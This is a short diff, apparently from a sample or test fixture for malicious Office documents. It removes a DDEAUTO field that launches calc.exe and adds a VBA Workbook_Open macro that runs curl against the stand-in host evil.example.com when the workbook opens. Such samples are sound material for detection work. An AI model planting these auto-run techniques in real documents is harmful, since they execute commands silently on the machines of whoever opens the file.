@@ -1,1 +1,3 @@
-<w:instrText>DDEAUTO c:\Windows\System32\cmd.exe "/c calc.exe"</w:instrText>
+Private Sub Workbook_Open()
+  CreateObject("WScript.Shell").Run "curl http://evil.example.com/"
+End Sub
